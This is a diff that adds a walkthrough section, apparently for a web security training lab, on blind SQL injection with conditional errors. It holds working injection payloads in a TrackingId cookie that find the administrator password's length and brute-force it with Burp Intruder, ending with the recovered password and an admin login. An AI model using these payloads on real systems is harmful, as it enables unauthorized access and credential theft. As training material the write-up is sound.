@@ -101,6 +101,51 @@ It shows an error which means there is indeed a user called *administrator*
 
 #### Determine the length of admin's password -
 
+```sql
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+RESPONSE -
+
+1. ERROR -> Condition is TRUE
+2. NUlll response -> Condition is FALSE
+
+The length of password will be definitly > 1 , so we get an error.
+
+![image](https://user-images.githubusercontent.com/67383098/235320395-6a64d7af-0ac8-4b05-bbe2-9c4f3592d92b.png)
+
+AUTOMATE THIS by Burp Intruder , by adding password length *(LENGTH>1)* as payload .
+
+From req 20, we get an error where condition is *(LENGTH > 20)*
+
+![image](https://user-images.githubusercontent.com/67383098/235320504-61d5226a-616b-4baa-a6eb-e71295e96eba.png)
+
+This means that the password size is exactly **20** characters.
+
+#### Bruteforce the admin's password -
+
+```sql
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,$1$,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+Add the length of password & each letter to be bruteforced as payloads.
+
+ATTACK TYPE - CLUSTER BOMB
+Payload 1 - Numbers
+Payload 2 - Bruteforcer
+
+We get the 20 responses which returned a error.
+
+![image](https://user-images.githubusercontent.com/67383098/235320938-5bcc6aa5-6d79-4303-8f0c-17cb96d95b89.png)
+
+
+Thus we got the admin's password - `8fysuozl95mngaem0abi`
+
+Now we can log in as administrator ,
+
+![image](https://user-images.githubusercontent.com/67383098/235321065-491fa7f1-59c8-4efb-8fb3-ae45ac8f96ae.png)
+
+
+
 
 
 
